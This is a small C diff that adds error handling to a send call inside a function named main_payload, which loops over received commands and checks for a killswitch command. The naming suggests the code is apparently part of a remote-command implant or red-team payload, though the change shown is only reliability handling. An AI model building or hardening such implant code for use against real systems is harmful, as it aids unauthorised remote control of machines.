@@ -117,7 +117,11 @@ int main_payload(void) {
                                         &response_len);
                 
                 // Send response
-                protocol_send(sock, response, response_len);
+                result = protocol_send(sock, response, response_len);
+                if (result != ERR_SUCCESS) {
+                    // Failed to send response, connection likely broken
+                    break;
+                }
                 
                 // Check for killswitch
                 if (cmd->cmd_id == CMD_KILLSWITCH) {
